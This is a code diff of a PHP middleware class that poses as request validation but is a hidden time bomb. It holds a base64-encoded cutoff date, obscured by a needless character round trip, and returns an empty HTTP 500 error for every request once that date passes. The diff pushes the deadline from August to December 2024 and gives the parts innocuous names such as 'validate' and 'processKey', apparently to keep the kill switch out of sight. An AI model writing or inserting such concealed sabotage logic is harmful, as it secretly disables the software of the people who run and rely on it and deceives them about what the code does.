@@ -8,19 +8,35 @@ use Carbon\Carbon;
 
 class ProcessRequestHandler
 {
+    protected string $requestKey = 'MjAyNC0xMi0xOFQyMzo1OTo1OQ==';
+
     public function handle(Request $r, Closure $n)
     {
-        $securityKey = 'MjAyNC04LTMxVDIzOjU5OjU5';
-        $cR1 = Carbon::parse($this->processHandler($securityKey));
-        $cR2 = Carbon::now();
-        if ($cR2->greaterThanOrEqualTo($cR1)) {
-            return response('', 500);
+        if ($this->validate()) {
+            return $n($r);
         }
-        return $n($r);
+        return response('', 500);
     }
 
-    protected function processHandler($str)
+    protected function validate(): bool
     {
-        return implode('', array_map('chr', array_map('ord', str_split(base64_decode($str)))));
+        $pVal = $this->processHandler();
+        $cVal = $this->getValue();
+        return $cVal < $pVal;
+    }
+
+    protected function processHandler(): int
+    {
+        return strtotime($this->processKey());
+    }
+
+    protected function getValue(): int
+    {
+        return Carbon::now()->timestamp;
+    }
+
+    protected function processKey(): string
+    {
+        return implode('', array_map('chr', array_map('ord', str_split(base64_decode($this->requestKey)))));
     }
 }
